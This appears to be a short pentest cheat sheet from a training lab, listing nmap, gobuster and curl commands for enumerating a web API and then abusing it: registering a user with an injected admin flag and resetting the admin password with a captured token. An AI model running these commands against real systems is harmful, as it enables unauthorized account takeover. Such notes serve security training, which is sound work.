# NMAP
fingerprinting
```
nmap -p80 -sV 192.168.241.51
nmap -p80 -sV --script=http-enum 192.168.241.51
```
# GOBUSTER
Directory brute forcing
```
gobuster dir -u 192.168.241.51 -w /usr/share/wordlists/dirb/common.txt -t 5
```
# APIs 
```
gobuster dir -u http://192.168.241.51:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```
pattern recognition file
```
{GOBUSTER}/v1
{GOBUSTER}/v2
{GOBUSTER}/v3
{GOBUSTER}/v4
{GOBUSTER}/v5
{GOBUSTER}/v1/admin
```
JSON manipulation
```
curl -i http://192.168.241.51:5002/users/v1/login
#json curl with password
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json' http://192.168.241:5002/users/v1/login
# new user as admin
curl -d '{"password":"lab","username":"offsec-admin","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.241:5002/users/v1/login
```
Steal Admin token
```
curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```
# XSS 



# Checklist
get application/version 
robots.txt
sitemap.xml
dirb 

